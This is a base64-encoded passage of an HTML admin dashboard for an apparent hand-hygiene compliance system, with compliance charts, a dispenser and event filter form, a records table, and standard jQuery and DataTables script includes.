SIgPldlZWtseTwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iRGFpbHkiID5EYWlseTwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3NlbGVjdD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L3NlY3Rpb24+CgogICAgICAgIDxzZWN0aW9uIGNsYXNzPSJjb250ZW50Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyLWZsdWlkIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyBtLTAgbWItMyI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IG0tMCBkLWZsZXggdy0xMDAiIHN0eWxlPSJwYWRkaW5nOiAuNzVyZW0gMDsiPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtMTIgY29sLW1kLTQgdGV4dC1tZC1sZWZ0ICI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWw+TGFzdCBMb2dpbjombmJzcDsmbmJzcDs8L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9InRleHQtbm93cmFwIiBpZD0ibGFzdExvZ2luIj4yMDI0LTEyLTE0IDIzOjQ3OjMxPC9zcGFuPgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIGNvbC1tZC00IHRleHQtbWQtY2VudGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbD5MYXN0IERpc3BlbnNlciBVc2VkOiZuYnNwOyZuYnNwOzwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0idGV4dC1ub3dyYXAiIGlkPSJsYXN0RGlzcGVuc2VyVXNlZCI+PC9zcGFuPgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIGNvbC1tZC00IHRleHQtbWQtcmlnaHQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsPkxhc3QgRGlzcGVuc2UgRXZlbnQ6Jm5ic3A7Jm5ic3A7PC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJ0ZXh0LW5vd3JhcCIgaWQ9Imxhc3REaXNwZW5zZUV2ZW50Ij48L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvc2VjdGlvbj4KCiAgICAgICAgPGRpdiBjbGFzcz0icm93IGNvbnRlbnQgbS0wIj4KICAgICAgICAgICAgPGRpdiBpZD0iY29tcGxpYW5jZVRyZW5kQ2hhcnREaXYiIGNsYXNzPSJjb2wtMTIgY29sLXNtLTEyIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQgY2FyZC1ncmF5Ij4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciBiZy1jb2xvciI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxoMyBjbGFzcz0iY2FyZC10aXRsZSI+Q29tcGxpYW5jZSBUcmVuZHM8L2gzPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSBjaGFydC1ib2R5Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2hhcnQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGNhbnZhcyBpZD0iY29tcGxpYW5jZVRyZW5kQ2hhcnQiIHN0eWxlPSJtYXgtaGVpZ2h0OiAxMDAlOyBtYXgtd2lkdGg6IDEwMCU7IiB3aWR0aD0iODUwIiBoZWlnaHQ9IjMyMCIgY2xhc3M9ImNoYXJ0anMtcmVuZGVyLW1vbml0b3IiPjwvY2FudmFzPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0iY29tcGxpYW5jZVRyZW5kQ2hhcnROb0RhdGEiIGNsYXNzPSJ3LTEwMCB0ZXh0LWNlbnRlciIgc3R5bGU9IndpZHRoOiAxMDAlOyBoZWlnaHQ6IDMyMHB4OyBkaXNwbGF5OiBub25lOyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGI+Tm8gRGF0YSBBdmFpbGFibGU8L2I+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICA8ZGl2IGlkPSJkaXNwZW5zZUV2ZW50c0J5RGVwYXJ0bWVudENoYXJ0RGl2IiBjbGFzcz0iY29sLTEyIGNvbC1zbS0xMiBjb2wteGwtNiI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkIGNhcmQtZ3JheSI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIgYmctY29sb3IiPgogICAgICAgICAgICAgICAgICAgICAgICA8aDMgY2xhc3M9ImNhcmQtdGl0bGUiPkRpc3BlbnNlIEV2ZW50cyBCeSBEZXBhcnRtZW50PC9oMz4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkgY2hhcnQtYm9keSI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNoYXJ0Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxjYW52YXMgaWQ9ImRpc3BlbnNlRXZlbnRzQnlEZXBhcnRtZW50Q2hhcnQiIHN0eWxlPSJtYXgtaGVpZ2h0OiAxMDAlOyBtYXgtd2lkdGg6IDEwMCU7IiB3aWR0aD0iNzMxIiBoZWlnaHQ9IjMyMCIgY2xhc3M9ImNoYXJ0anMtcmVuZGVyLW1vbml0b3IiPjwvY2FudmFzPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0iZGlzcGVuc2VFdmVudHNCeURlcGFydG1lbnRDaGFydE5vRGF0YSIgY2xhc3M9InctMTAwIHRleHQtY2VudGVyIiBzdHlsZT0iaGVpZ2h0OiAzMjBweDsgZGlzcGxheTogbm9uZTsiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxiPk5vIERhdGEgQXZhaWxhYmxlPC9iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgPGRpdiBpZD0ibWlzc2VkT3Bwb3J0dW5pdGllc1ZTU2FuaXRpemF0aW9uQ2hhcnREaXYiIGNsYXNzPSJjb2wtMTIgY29sLXNtLTEyIGNvbC14bC02Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQgY2FyZC1ncmF5Ij4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciBiZy1jb2xvciI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxoMyBjbGFzcz0iY2FyZC10aXRsZSI+TWlzc2VkIE9wcG9ydHVuaXRpZXMgdnMuIENvbXBsaWFudCBFdmVudHM8L2gzPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSBjaGFydC1ib2R5Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2hhcnQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGNhbnZhcyBpZD0ibWlzc2VkT3Bwb3J0dW5pdGllc1ZTU2FuaXRpemF0aW9uQ2hhcnQiIHN0eWxlPSJtYXgtaGVpZ2h0OiAxMDAlOyBtYXgtd2lkdGg6IDEwMCU7IiB3aWR0aD0iNzMxIiBoZWlnaHQ9IjMyMCIgY2xhc3M9ImNoYXJ0anMtcmVuZGVyLW1vbml0b3IiPjwvY2FudmFzPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0ibWlzc2VkT3Bwb3J0dW5pdGllc1ZTU2FuaXRpemF0aW9uQ2hhcnROb0RhdGEiIGNsYXNzPSJ3LTEwMCB0ZXh0LWNlbnRlciIgc3R5bGU9ImhlaWdodDogMzIwcHg7IGRpc3BsYXk6IG5vbmU7Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Yj5ObyBEYXRhIEF2YWlsYWJsZTwvYj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIj4KICAgICAgICAgICAgPGhyIGNsYXNzPSJib3JkZXItZGFyayBteC0yIiBzdHlsZT0iYm9yZGVyLXdpZHRoOiBtZWRpdW07Ij4KICAgICAgICA8L2Rpdj4KCiAgICAgICAgPGRpdiBjbGFzcz0icm93IG0tMCBweC0yIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIGNvbC1zbS0xMiBjb2wteGwtMTIgbXQtMyI+CiAgICAgICAgICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgICAgIAo8ZGl2IGNsYXNzPSJjb250ZW50LXdyYXBwZXIgYmctY29sb3IiIHN0eWxlPSJtaW4taGVpZ2h0OiA1OTNweDsiPgogICAgPHNlY3Rpb24gY2xhc3M9ImNvbnRlbnQgcHgtMCI+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyLWZsdWlkIHB4LTAiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3cgYmctY29sb3IgcmVwb3J0LWhlYWRlciByb3VuZGVkLWVkZ2VzIiBzdHlsZT0ibWluLWhlaWdodDo1NXB4O3BhZGRpbmc6OXB4IDBweDttYXJnaW46MCAwIDEwcHggMDsiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIGNvbC1tZC01Ij4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGlkPSJleHBvcnQiPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgaWQ9ImV4cG9ydFRleHQiPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2xvci13aGl0ZSB0ZXh0LWNlbnRlciB0ZXh0LW1kLWxlZnQgcGItMSBwYi1tZC0wIiBzdHlsZT0icGFkZGluZy1sZWZ0OiAwLjc1cmVtOyBmb250LXNpemU6IDAuN3JlbTsiPkV4cG9ydCBmaWxlcyBjb250YWluaW5nIG92ZXIgMTAsMDAwIHJlY29yZHMgd2lsbCBiZSBlbWFpbGVkLjwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtMTIgY29sLW1kLTciPgogICAgICAgICAgICAgICAgICAgIDxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0OyBkaXNwbGF5OiB0YWJsZTsiIGNsYXNzPSJkdC1idXR0b25zIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biBmaWx0ZXItYnRuIiBvbmNsaWNrPSJzaG93RmlsdGVycygpIiBzdHlsZT0ibWluLXdpZHRoOjUwcHg7bWFyZ2luLXJpZ2h0OjBweDsiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1maWx0ZXIgZmEtMXgiIGFyaWEtaGlkZGVuPSJ0cnVlIiBzdHlsZT0ibGluZS1oZWlnaHQ6IDEuNGVtOyI+PC9pPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgaWQ9ImZpbHRlcnMiIGNsYXNzPSJyb3cgbWItMyIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij48ZGl2IGNsYXNzPSJjb2wtc20tMTIiPjxmb3JtIGlkPSJmaWx0ZXJGb3JtIiBvbnN1Ym1pdD0icmV0dXJuIGZhbHNlOyI+PGRpdiBjbGFzcz0iZm9ybS1ncm91cCBmb3JtLWlubGluZSByb3cganVzdGlmeS1jb250ZW50LWNlbnRlciBqdXN0aWZ5LWNvbnRlbnQtbWQtc3RhcnQiPjxkaXYgaWQ9ImRpc3BlbnNlcl9maWx0ZXJfY29udGFpbmVyIiBjbGFzcz0iY29sLTEyIGNvbC1zbS04IGNvbC1tZC02IGNvbC14bC00IGQtZmxleCI+PGxhYmVsIGNsYXNzPSJjb2wtNCBqdXN0aWZ5LWNvbnRlbnQtc3RhcnQiPkRpc3BlbnNlciA8L2xhYmVsPjxkaXYgY2xhc3M9ImNvbC04IHAtMCI+PHNlbGVjdCBpZD0iZGlzcGVuc2VyX2lkIiBuYW1lPSJkaXNwZW5zZXJfaWQiIGNsYXNzPSJmb3JtLWNvbnRyb2wgaW5wdXQtc20gY29sLXNtLTYganVzdGlmeS1jb250ZW50LXN0YXJ0ICAgc2VhcmNoYWJsZVNlbGVjdENsYXNzICIgICAgcGxhY2Vob2xkZXJuYW1lPSJEaXNwZW5zZXIiPjxvcHRpb24+PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTA5IiA+QTIyMjIzMDAyNjY5PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMjY4IiA+QTIyMjIzMDAzMDQ1PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTMyIiA+QTIyMjIzMDAzMjgxPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTU3IiA+QTIyMjIzMDAzOTI2PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTA0IiA+QTIyMjIzMDA0NTM0PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTMzIiA+QTIyMjIzMDA0NjI3PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMzQ3IiA+QTIyMjIzMDA0NjQ3PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTM3IiA+QTIyMjIzMDA0ODkwPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iNjciID5BQiBreG00LTI8L29wdGlvbj48b3B0aW9uIHZhbHVlPSIxOSIgPkFXUyBUZXN0aW5nPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTAxIiA+Q0tlIC0gMzk1MDwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IjEwNiIgPkNLZSAtIDQzNjY8L29wdGlvbj48b3B0aW9uIHZhbHVlPSIxMjMiID5DS2UgLSA0OTI3PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTE5IiA+Q0tvIC0gNDI5ODwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IjEyMCIgPkNLbyAtIDQ2Njg8L29wdGlvbj48b3B0aW9uIHZhbHVlPSI3OCIgPkRIMTQyMTwvb3B0aW9uPjxvcHRpb24gdmFsdWU9Ijk1IiA+REgzOTUxPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTI4IiA+REg0NzIxPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMTM0IiA+TEwtMzMxNjwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IjEyNSIgPkxMLTUwMzE8L29wdGlvbj48b3B0aW9uIHZhbHVlPSIzMzEiID5NRU5BIERlbW8gRGlzcGVuc2VyIC0gMzIyMDwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IjExNCIgPlJLIEdhci4gNDAxMDg2IChBMjIyMjMwMDQ3MjkpPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iOTgiID5SSyBQYXQuIDNGRTFGOCAoQTIyMjIzMDA0NzIyKTwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IjExNSIgPlJLIFB1Yi4gM0ZBQThBIChBMjIyMjMwMDUwODUpPC9vcHRpb24+PC9zZWxlY3Q+PC9kaXY+PC9kaXY+PC9kaXY+PGRpdiBjbGFzcz0iZm9ybS1ncm91cCBmb3JtLWlubGluZSByb3cganVzdGlmeS1jb250ZW50LWNlbnRlciBqdXN0aWZ5LWNvbnRlbnQtbWQtc3RhcnQiPjxkaXYgaWQ9ImV2ZW50X2ZpbHRlcl9jb250YWluZXIiIGNsYXNzPSJjb2wtMTIgY29sLXNtLTggY29sLW1kLTYgY29sLXhsLTQgZC1mbGV4Ij48bGFiZWwgY2xhc3M9ImNvbC00IGp1c3RpZnktY29udGVudC1zdGFydCI+RXZlbnQgPC9sYWJlbD48ZGl2IGNsYXNzPSJjb2wtOCBwLTAiPjxzZWxlY3QgaWQ9ImV2ZW50IiBuYW1lPSJldmVudCIgY2xhc3M9ImZvcm0tY29udHJvbCBpbnB1dC1zbSBjb2wtc20tNiBqdXN0aWZ5LWNvbnRlbnQtc3RhcnQgbXVsdGlwbGUgIiBtdWx0aXBsZSAgIHBsYWNlaG9sZGVybmFtZT0iRXZlbnQiPjxvcHRpb24gdmFsdWU9IlNhbml0aXplZCIgPlNhbml0aXplZDwvb3B0aW9uPjxvcHRpb24gdmFsdWU9IkNoZWNrIEluIiA+Q2hlY2sgSW48L29wdGlvbj48b3B0aW9uIHZhbHVlPSJDaGVjayBPdXQiID5DaGVjayBPdXQ8L29wdGlvbj48L3NlbGVjdD48L2Rpdj48L2Rpdj48L2Rpdj48ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGZvcm0taW5saW5lIHJvdyBqdXN0aWZ5LWNvbnRlbnQtY2VudGVyIGp1c3RpZnktY29udGVudC1tZC1zdGFydCI+PGRpdiBpZD0iY29tcGxpYW5jZV9maWx0ZXJfY29udGFpbmVyIiBjbGFzcz0iY29sLTEyIGNvbC1zbS04IGNvbC1tZC02IGNvbC14bC00IGQtZmxleCI+PGxhYmVsIGNsYXNzPSJjb2wtNCBqdXN0aWZ5LWNvbnRlbnQtc3RhcnQiPkNvbXBsaWFuY2UgPC9sYWJlbD48ZGl2IGNsYXNzPSJjb2wtOCBwLTAiPjxzZWxlY3QgaWQ9ImlzX2NvbXBsaWFudCIgbmFtZT0iaXNfY29tcGxpYW50IiBjbGFzcz0iZm9ybS1jb250cm9sIGlucHV0LXNtIGNvbC1zbS02IGp1c3RpZnktY29udGVudC1zdGFydCAgIiAgICBwbGFjZWhvbGRlcm5hbWU9IkNvbXBsaWFuY2UiPjxvcHRpb24+PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMCIgPk5PPC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0iMSIgPllFUzwvb3B0aW9uPjwvc2VsZWN0PjwvZGl2PjwvZGl2PjwvZGl2PjxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgZm9ybS1pbmxpbmUgcm93IGp1c3RpZnktY29udGVudC1jZW50ZXIganVzdGlmeS1jb250ZW50LW1kLXN0YXJ0Ij48ZGl2IGNsYXNzPSJjb2wtMTIgY29sLXNtLTggY29sLW1kLTYgY29sLXhsLTQgZC1mbGV4Ij48bGFiZWwgZm9yPSJEYXRlIFJhbmdlIiBjbGFzcz0iY29sLXNtLTQiIHN0eWxlPSJqdXN0aWZ5LWNvbnRlbnQ6bGVmdCI+RGF0ZSBSYW5nZSA8L2xhYmVsPjxkaXYgY2xhc3M9ImNvbC04IHAtMCIgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48aW5wdXQgY2xhc3M9ImZvcm0tY29udHJvbCBkYXRlUmFuZ2VJbnB1dCBkLWlubGluZS1ibG9jayAiIHR5cGU9InRleHQiIG5hbWU9ImNyZWF0ZWRfYXQiIGlkPSJjcmVhdGVkX2F0IiB2YWx1ZT0iIiBzdHlsZT0id2lkdGg6IDk0JTsiIHBsYWNlaG9sZGVyPSJTZWxlY3QgRGF0ZSIgb25jaGFuZ2U9ImNoYW5nZURhdGVSYW5nZSh0aGlzLnZhbHVlLCAnY3JlYXRlZF9hdGNhbmNlbEJ1dHRvbicpIiAvPjxidXR0b24gaWQ9ImNyZWF0ZWRfYXRjYW5jZWxCdXR0b24iIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImNhbmNlbEJ1dHRvbiBkLW5vbmUiPjxzcGFuIGFyaWEtaGlkZGVuPSJ0cnVlIj7Dlzwvc3Bhbj48L2J1dHRvbj48L2Rpdj48L2Rpdj48L2Rpdj48ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGZvcm0taW5saW5lIGp1c3RpZnktY29udGVudC1jZW50ZXIganVzdGlmeS1jb250ZW50LW1kLXN0YXJ0Ij48YnV0dG9uIGNsYXNzPSJidG4gYnRuLWRhcmsgZmxvYXQtc20tcmlnaHQgbXItMiIgb25jbGljaz0iZmlsdGVyRGF0YSgnZmlsdGVyJykiPlN1Ym1pdDwvYnV0dG9uPjxidXR0b24gY2xhc3M9ImJ0biBidG4tc2Vjb25kYXJ5IGZsb2F0LXNtLXJpZ2h0IG1yLTIiIG9uY2xpY2s9ImZpbHRlckRhdGEoJ3Jlc2V0JykiPlJlc2V0IEZpbHRlcnM8L2J1dHRvbj48L2Rpdj48L2Zvcm0+PC9kaXY+PC9kaXY+ICAgICAgICAgICAgPGRpdiBpZD0iZmllbGRjb25maWciIGNsYXNzPSJyb3ciIHN0eWxlPSJkaXNwbGF5Om5vbmU7bWFyZ2luOjIwcHggMDtib3JkZXItYm90dG9tOjFweCBzb2xpZCAjMzQzYTQwOyI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGZvcm0taW5saW5lIHctMTAwIj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPHRhYmxlIGlkPSJyZWNvcmRzIiBjbGFzcz0idGFibGUgdGFibGUtYm9yZGVyZWQgdGFibGUtaG92ZXIgZGF0YVRhYmxlIiBzdHlsZT0id2lkdGg6MTAwJTsgbWFyZ2luLXRvcDogMHB4ICFpbXBvcnRhbnQ7Ij4KICAgICAgICAgICAgICAgIDx0aGVhZD4KICAgICAgICAgICAgICAgICAgICA8dHIgcm9sZT0icm93Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPHRoPkV2ZW50PC90aD48dGg+T3JnYW5pemF0aW9uPC90aD48dGg+R3JvdXA8L3RoPjx0aD5EaXNwZW5zZXI8L3RoPjx0aD5Vc2VyPC90aD48dGg+VGFnPC90aD48dGg+VGFnIFJTU0kgKGRCbSk8L3RoPjx0aD5Db21wbGlhbmNlPC90aD48dGg+RGF0ZTwvdGg+ICAgICAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgPC90aGVhZD4KICAgICAgICAgICAgPC90YWJsZT4KICAgICAgICA8L2Rpdj4KICAgIDwvc2VjdGlvbj4KPC9kaXY+CiAgICA8L2Rpdj4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9qcy9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9qcy9qcXVlcnktdWkubWluLmpzIj48L3NjcmlwdD4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9qcy9ib290c3RyYXAuYnVuZGxlLm1pbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgCiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvZGF0YXRhYmxlcy9qcXVlcnkuZGF0YVRhYmxlcy5taW4uanMiPjwvc2NyaXB0PgogICAgICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2pzL2RhdGF0YWJsZXMvZGF0YVRhYmxlcy5ib290c3RyYXAubWluLmpzIj48L3NjcmlwdD4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9qcy9kYXRhdGFibGVzL2RhdGFUYWJsZXMuYm9vdHN0cmFwNC5taW4uanMiPjwvc2NyaXB0PgogICAgICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2pzL2RhdGF0YWJsZXMvZGF0YVRhYmxlcy5yZXNwb25zaXZlLm1pbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvZGF0YXRhYmxlcy9yZXNwb25zaXZlLmJvb3RzdHJhcDQubWluLmpzIj48L3NjcmlwdD4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9qcy9kYXRhdGFibGVzL2RhdGFUYWJsZXMuYnV0dG9ucy5taW4uanMiPjwvc2NyaXB0PgogICAgICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2pzL2RhdGF0YWJsZXMvYnV0dG9ucy5ib290c3RyYXA0Lm1pbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvZGF0YXRhYmxlcy9qc3ppcC5taW4uanMiPjwvc2NyaXB0PgogICAgICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2pzL2RhdGF0YWJsZXMvcGRmbWFrZS5taW4uanMiPjwvc2NyaXB0PgogICAgICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2pzL2RhdGF0YWJsZXMvdmZzX2ZvbnRzLmpzIj48L3NjcmlwdD4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9qcy9kYXRhdGFibGVzL2J1dHRvbnMucHJpbnQubWluLmpzIj48L3NjcmlwdD4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9qcy9kYXRhdGFibGVzL2J1dHRvbnMuaHRtbDUubWluLmpzIj48L3NjcmlwdD4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9qcy9kYXRhdGFibGVzL2RhdGF0YWJsZXNJbnB1dC5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvZGF0YXRhYmxlcy9kYXRhVGFibGVzLmZpeGVkQ29sdW1ucy5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvZGF0YXRhYmxlcy9kYXRhVGFibGVzLmNvbFJlb3JkZXIubWluLmpzIj48L3NjcmlwdD4KCiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvdmFsaWRhdGlvbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvYWRtaW4uanMiPjwvc2NyaXB0PgogICAgICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2pzL2FwcC5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvc2NyaXB0cy5qcz92PWY3MmQ0MiI+PC9zY3JpcHQ+CiAgICAgICAgPH